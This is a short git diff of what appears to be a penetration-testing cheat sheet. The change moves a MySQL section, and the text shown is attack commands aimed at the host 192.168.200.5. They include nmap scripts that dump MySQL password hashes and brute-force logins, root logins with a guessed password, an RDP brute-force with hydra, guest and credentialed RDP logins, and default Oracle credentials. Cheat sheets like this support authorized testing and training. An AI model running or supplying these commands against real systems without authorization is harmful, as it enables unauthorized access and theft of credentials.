@@ -118,6 +118,13 @@ https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
 sys:sys
 scott:tiger
 
+# 3306 MySQL
+nmap -p 3306 -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.200.5
+nmap -p 3306 -v --script mysql-brute -T5 -nv 192.168.200.5
+mysql -h 192.168.200.5 -u root -p
+mysql -h 192.168.200.5 --port=3306 --user=root -p 
+mysql -h 192.168.200.5 -uroot -ppassword -e 'show databases;' 
+
 # 3389 RDP Remote Desktop
 rdesktop -u guest -p guest 192.168.200.5 -g 94%   ..Login to learn OS
 hydra -t 1 -V -f -l users.txt -P $commontenk rdp://192.168.200.5
@@ -126,13 +133,6 @@ xfreerdp /v:192.168.200.5 /d:mike.com /u:bob /p:paxxword -sec-nla +clipboard /ge
 
 # 5437 Postgres
 psql -h 192.168.200.5 -U postgres -p 5437
-
-# 3306 MySQL
-nmap -p 3306 -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.200.5
-nmap -p 3306 -v --script mysql-brute -T5 -nv 192.168.200.5
-mysql -h 192.168.200.5 -u root -p
-mysql -h 192.168.200.5 --port=3306 --user=root -p 
-mysql -h 192.168.200.5 -uroot -ppassword -e 'show databases;' 
 
 
 # Default cred scan: 
